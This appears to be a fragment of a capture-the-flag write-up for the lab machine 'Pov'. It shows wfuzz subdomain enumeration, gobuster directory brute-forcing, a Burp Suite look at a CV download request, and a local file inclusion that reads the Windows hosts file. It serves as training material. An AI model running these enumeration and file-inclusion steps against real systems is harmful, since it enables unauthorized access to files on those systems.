![](<attachments/Pasted image 20260109224035.png>)
```bash
wfuzz -c --hc=404 --hh=12330 -t 200 -w /usr/share/seclists/Disco...million-110000.txt -H "Host: FUZZ.pov.htb" http://10.129.230.183
```
we’ll enumerate subdomains and we found a `dev`
![](<attachments/Pasted image 20260109224316.png>)
when visiting `dev` it redirects us to `/portfolio`, so based on that we’ll keep doing directory brute-forcing, but this time with `gobuster`
![](<attachments/Pasted image 20260109224802.png>)
```bash
gobuster dir -u http://dev.pov.htb/portfolio -w /usr/share/secli...rBuster-2007_directory-list-2.3-medium.txt -x aspx | grep -v 302
```

![](<attachments/Pasted image 20260109224922.png>)
clicking the `Download CV` button does not redirect to that function, so we’ll intercept it with Burp Suite to see how the request is sent
![](<attachments/Pasted image 20260109225245.png>)
	`file=cv.pdf` thanks to this we can do a local file inclusion
![](<attachments/Pasted image 20260109225641.png>)
```powershell
c:\Windows\System32\Drivers\etc\hosts
```
![](<attachments/Pasted image 20260109225738.png>)
